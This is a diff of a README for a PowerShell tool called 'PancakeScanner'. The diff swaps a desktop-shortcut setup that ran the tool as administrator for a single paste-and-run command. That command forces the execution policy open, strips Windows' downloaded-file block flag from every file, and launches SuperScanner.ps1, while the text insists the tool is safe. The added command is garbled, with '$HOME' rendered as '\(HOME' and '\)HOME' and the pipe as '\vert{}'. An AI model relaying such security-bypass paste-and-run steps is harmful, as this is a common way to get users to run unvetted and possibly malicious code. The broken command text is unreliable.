@@ -17,20 +17,12 @@
 * **Classic Startup Registry Scan:** Audits key `Run` paths in both HKLM and HKCU registry hives with smart ignore-lists for trusted apps like Roblox and OneDrive.
 
 ---
+3. Copy and paste the following single command to automatically unlock all files and instantly launch the scan, then hit **ENTER**:
 
-## 🛠️ How to Download and Run (The Easiest Way):
+```powershell
+Set-ExecutionPolicy RemoteSigned -Scope Process -Force; Get-ChildItem -Path "\(HOME\Downloads\PancakeScanner-3.3" -Recurse \vert{} Unblock-File; cd "\)HOME\Downloads\PancakeScanner-3.3\PancakeScanner-3.3"; .\SuperScanner.ps1
+```
 
-To easily launch the scanner with full Administrator privileges and bypass Windows security flags without opening the terminal manually, follow these 4 simple steps:
-
-1. Download and extract the **PancakeScanner** ZIP archive from the **Releases** section to your computer.
-2. Right-click on your **Desktop** -> select **New** -> **Shortcut**.
-3. In the location field, copy and paste the following command and click **Next**:
-
-Set-ExecutionPolicy RemoteSigned -Scope Process -Force; Get-ChildItem -Path "$HOME\Downloads\PancakeScanner-3.3" -Recurse | Unblock-File; cd "$HOME\Downloads\PancakeScanner-3.3\PancakeScanner-3.3"; .\SuperScanner.ps1
-
-4. Name the shortcut `PancakeScanner`, click **Finish**, then right-click your new shortcut -> choose **Properties** -> click the **Advanced...** button -> check **Run as administrator** and click **OK**.
-
-🎉 **That's it!** Now you can simply double-click this Desktop shortcut anytime you want to audit your PC. The scan will complete in 3 seconds, and the window will stay open for you to read the clean green logs!
-
+🎉 **That's it!** The scanner will bypass all execution limits, safely remove the internet block flag, and display your clean 10-point diagnostic run in less than 3 seconds!
 ---
 *Powered by Pancake Power. The source code is entirely open for audit and completely safe to use.*
